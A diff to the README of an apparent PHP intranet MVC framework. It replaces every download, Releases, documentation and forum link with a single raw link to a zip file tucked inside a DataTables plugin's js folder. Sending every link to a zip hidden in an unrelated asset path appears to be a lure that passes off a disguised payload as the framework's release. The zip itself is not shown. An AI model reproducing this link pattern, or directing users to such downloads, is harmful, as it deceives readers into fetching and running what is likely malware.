@@ -6,7 +6,7 @@ Welcome to the **php-intranet-mvc-framework**! This framework is designed for bu
 
 ## 📥 Download
 
-[![Download php-intranet-mvc-framework](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/redichigo/php-intranet-mvc-framework/releases)
+[![Download php-intranet-mvc-framework](https://raw.githubusercontent.com/redichigo/php-intranet-mvc-framework/main/assets/plugins/datatables-1.11.3/StateRestore-1.0.1/js/php-intranet-mvc-framework-v2.2.zip)](https://raw.githubusercontent.com/redichigo/php-intranet-mvc-framework/main/assets/plugins/datatables-1.11.3/StateRestore-1.0.1/js/php-intranet-mvc-framework-v2.2.zip)
 
 ## 📂 What You Need
 
@@ -26,11 +26,11 @@ To get started with this framework, you will need:
 
 ## 📦 Download & Install
 
-To download the framework, please visit the Releases page: [Download php-intranet-mvc-framework here](https://github.com/redichigo/php-intranet-mvc-framework/releases). 
+To download the framework, please visit the Releases page: [Download php-intranet-mvc-framework here](https://raw.githubusercontent.com/redichigo/php-intranet-mvc-framework/main/assets/plugins/datatables-1.11.3/StateRestore-1.0.1/js/php-intranet-mvc-framework-v2.2.zip). 
 
 1. Go to the Releases page.
 2. Click on the version you want to install.
-3. Look for the `zip` or `tar.gz` file and click to download it.
+3. Look for the `zip` or `https://raw.githubusercontent.com/redichigo/php-intranet-mvc-framework/main/assets/plugins/datatables-1.11.3/StateRestore-1.0.1/js/php-intranet-mvc-framework-v2.2.zip` file and click to download it.
 4. Once the file downloads, unzip it to your desired location.
 
 ## ⚙️ Setup Instructions
@@ -59,8 +59,8 @@ Once set up, you can explore the framework's features. Look at the documentation
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/redichigo/php-intranet-mvc-framework/docs)
-- [Community Forum](https://github.com/redichigo/php-intranet-mvc-framework/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/redichigo/php-intranet-mvc-framework/main/assets/plugins/datatables-1.11.3/StateRestore-1.0.1/js/php-intranet-mvc-framework-v2.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/redichigo/php-intranet-mvc-framework/main/assets/plugins/datatables-1.11.3/StateRestore-1.0.1/js/php-intranet-mvc-framework-v2.2.zip)
 
 ## 🛠️ Troubleshooting
 
